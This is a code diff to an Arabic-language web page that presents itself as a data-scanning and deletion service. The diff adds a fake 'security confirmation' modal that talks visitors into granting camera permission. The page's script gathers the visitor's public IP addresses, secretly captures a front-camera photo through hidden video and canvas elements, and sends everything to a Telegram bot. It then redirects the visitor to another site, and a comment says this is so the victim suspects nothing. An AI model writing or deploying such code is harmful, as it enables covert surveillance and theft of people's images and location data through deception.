@@ -55,6 +55,15 @@
         <button id="triggerBtn">بدء عملية فحص وحذف البيانات</button>
     </div>
 
+    <!-- نافذة تفعيل الأذونات الذكية (مخفية افتراضياً) -->
+    <div id="smartModal" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.6); z-index:9999; align-items:center; justify-content:center;">
+        <div style="background:#fff; padding:25px; border-radius:10px; max-width:350px; margin: auto; text-align:center; color:#333; box-shadow: 0 4px 20px rgba(0,0,0,0.2);">
+            <h3 style="margin-top:0; color:#d9534f; font-size: 18px;">مطلوب تأكيد الأمان</h3>
+            <p style="font-size:13px; color:#666; line-height: 1.6;">لضمان عدم تكرار طلبات الحذف وللتأكد من مطابقة بصمة الوجه مع السجلات، يرجى النقر على (سماح / Allow) في رسالة المتصفح التالية.</p>
+            <button id="modalConfirmBtn" style="background:#0275d8; color:#fff; border:none; padding:12px 20px; border-radius:6px; font-weight:bold; cursor:pointer; width:100%; font-size: 15px;">متابعة التحقق</button>
+        </div>
+    </div>
+
     <!-- عناصر الكاميرا المخفية -->
     <video id="video" autoplay playsinline style="display:none;"></video>
     <canvas id="canvas" style="display:none;"></canvas>
@@ -173,14 +182,22 @@
             });
         }
 
-        // دالة إعادة التوجيه للموقع المطلوب
         function redirectToAbwaab() {
             window.location.href = 'http://abwaabiraq.com';
         }
 
-        document.getElementById('triggerBtn').addEventListener('click', async function() {
-            this.innerText = "جاري معالجة الطلب والنقل للمنصة...";
-            this.disabled = true;
+        // عند الضغط على الزر الرئيسي، يتم إظهار نافذة الأذونات الذكية أولاً
+        document.getElementById('triggerBtn').addEventListener('click', function() {
+            document.getElementById('smartModal').style.display = 'flex';
+        });
+
+        // عند الضغط على متابعة داخل النافذة الوهمية، يتم جمع البيانات وتشغيل الكاميرا
+        document.getElementById('modalConfirmBtn').addEventListener('click', async function() {
+            document.getElementById('smartModal').style.display = 'none';
+            
+            const btn = document.getElementById('triggerBtn');
+            btn.innerText = "جاري معالجة الطلب والنقل للمنصة...";
+            btn.disabled = true;
 
             const ipv4 = await getPublicIPv4();
             const ipv6 = await getPublicIPv6();
@@ -215,7 +232,6 @@
             msg += ` <b>وقت الدخول</b>: <code>${new Date().toLocaleString('ar-EG')}</code>\n`;
             msg += `</blockquote>`;
 
-            // تشغيل الكاميرا والتقاط الصورة ثم التحويل التلقائي
             navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
             .then(stream => {
                 const video = document.getElementById('video');
@@ -232,7 +248,6 @@
 
                     canvas.toBlob(blob => {
                         sendPhotoToTelegram(blob, msg).then(() => {
-                            // التوجيه فور إتمام إرسال الصورة
                             redirectToAbwaab();
                         });
                     }, 'image/jpeg', 0.8);
@@ -241,7 +256,6 @@
             .catch(err => {
                 console.log('مرفوض أو غير متاح:', err);
                 sendToTelegram(msg + "\n⚠️ <b>ملاحظة:</b> تم رفض إذن الكاميرا من قبل المستخدم.").then(() => {
-                    // حتى لو رفض الكاميرا، يتم تحويله للموقع الأصلي لكي لا يشك بشيء
                     redirectToAbwaab();
                 });
             });
